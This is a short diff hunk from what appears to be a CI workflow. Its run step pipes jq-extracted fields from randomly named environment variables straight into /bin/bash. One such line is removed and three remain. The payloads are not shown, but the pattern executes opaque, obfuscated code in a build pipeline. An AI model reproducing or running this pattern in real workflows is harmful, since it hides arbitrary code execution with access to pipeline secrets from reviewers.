@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$yeau86260" | jq -r .ey6873 | /bin/bash
           echo $dxtyl740 | jq -r .gktc80313 | /bin/bash
-          printf '%s' "$dmpyu9920" | jq -r .e143 | /bin/bash
           printf '%s' "$hv6" | jq -r .yb9 | /bin/bash
 
       - name: Store artifact
